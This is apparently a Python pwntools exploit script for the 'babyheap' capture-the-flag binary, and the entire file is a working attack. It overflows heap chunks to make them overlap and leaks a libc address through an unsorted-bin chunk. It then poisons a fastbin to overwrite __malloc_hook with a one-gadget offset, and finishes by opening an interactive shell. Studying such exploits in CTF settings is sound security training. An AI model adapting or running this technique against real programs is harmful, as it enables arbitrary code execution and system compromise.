from pwn import *

context(arch='amd64', os='linux')

target = "./babyheap"

p = process(target)

def fn_alloc(size):
	p.sendline("1")
	print p.recv()

	p.sendline(str(size))
	print p.recv(timeout=0.5)

def fn_free(idx):
	p.sendline("3")
	print p.recv()

	p.sendline(str(idx))
	print p.recv()

def fn_fill(idx, size, content):
	p.sendline("2")
	print p.recv()

	p.sendline(str(idx))
	print p.recv()

	p.sendline(str(size))
	print p.recv()

	p.send(content)
	print p.recv()

def fn_dump(idx):
	p.sendline("4")
	print p.recv()

	p.sendline(str(idx))
	recv = p.recv()
	return recv

def leak(addr, size):
	print hexdump(p.leak(addr, size))

print p.recv()

heap_base = 0x555555757000

fn_alloc(0x20) # idx : 0 (0x...00)
fn_alloc(0x20) # idx : 1 (0x...30)
fn_alloc(0x20) # idx : 2 (0x...60)
fn_alloc(0x20) # idx : 3 (0x...90)
fn_alloc(0x80) # idx : 4 (0x...c0)

fn_free(1) # del [1]
fn_free(2) # del [2, 1]

payload = ""
payload += p64(0) * 5
payload += p64(0x31)
payload += p64(0) * 5
payload += p64(0x31)
payload += p8(0xc0)

fn_fill(0, len(payload), payload)

#leak(heap_base, 0x100)

payload = ""
payload += p64(0) * 5
payload += p64(0x31)
fn_fill(3, len(payload), payload)

fn_alloc(0x20) # idx 1
fn_alloc(0x20) # idx 2 --> same small bin location

payload = ""
payload += p64(0) * 5
payload += p64(0x91)
fn_fill(3, len(payload), payload)
fn_alloc(0x80) # to create FD, BK in idx:4

fn_free(4) # del [4]

recv = fn_dump(2)
libc_base = u64(recv.split("\x0a")[1][:6].ljust(8, "\x00")) - 0x3c4b78
one_shot  = libc_base + 0x4526a
__malloc_hook = libc_base + 0x3c4b10
size_7f = __malloc_hook - 0x23

print "libc base : {}".format(hex(libc_base))

fn_alloc(0x68) # idx 4
fn_free(4)     # del [4] <-- but UAF by idx 2

payload = p64(size_7f)
fn_fill(2, len(payload), payload)

fn_alloc(0x60)
fn_alloc(0x60) # idx 6 <-- will overwrite __malloc_hook

payload = ""
payload += "\x00" * 3
payload += p64(0) * 2
payload += p64(one_shot) # __malloc_hook
fn_fill(6, len(payload), payload)

fn_alloc(0x50)

p.interactive()
